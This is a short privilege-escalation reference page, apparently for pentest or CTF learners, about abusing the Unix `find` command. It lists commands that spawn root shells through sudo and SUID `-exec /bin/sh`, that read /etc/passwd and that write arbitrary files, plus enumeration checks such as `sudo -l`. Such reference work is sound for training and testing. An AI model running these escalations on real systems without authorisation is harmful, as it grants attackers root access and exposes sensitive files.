# find

## Description

`find` is commonly used to search for files and directories. Depending on its execution context (normal user, `sudo`, or SUID), it can also be leveraged for privilege escalation or file operations.

---

## Capabilities

| Technique    | Supported |
| ------------ | :-------: |
| Shell Escape |     ✅     |
| File Read    |     ✅     |
| File Write   |     ✅     |
| Sudo Abuse   |     ✅     |
| SUID Abuse   |     ✅     |

---

## Shell Escape

Spawn an interactive shell using `find`.

```bash
find . -exec /bin/sh \; -quit
```

### With sudo

```bash
sudo find . -exec /bin/sh \; -quit
```

### With SUID

```bash
./find . -exec /bin/sh -p \; -quit
```

---

## File Read

Read the contents of a file through `find`.

```bash
find /path/to/file -exec cat {} \;
```

Example:

```bash
find /etc/passwd -exec cat {} \;
```

---

## File Write

Write arbitrary data into a file.

```bash
find / -fprintf /tmp/output "Hello Zero2Root\n" -quit
```

---

## Detection

Check whether `find` can be abused:

```bash
which find

find --version

sudo -l

find / -perm -4000 2>/dev/null
```

---

## References

* GTFOBins – Find
* GNU Findutils Documentation
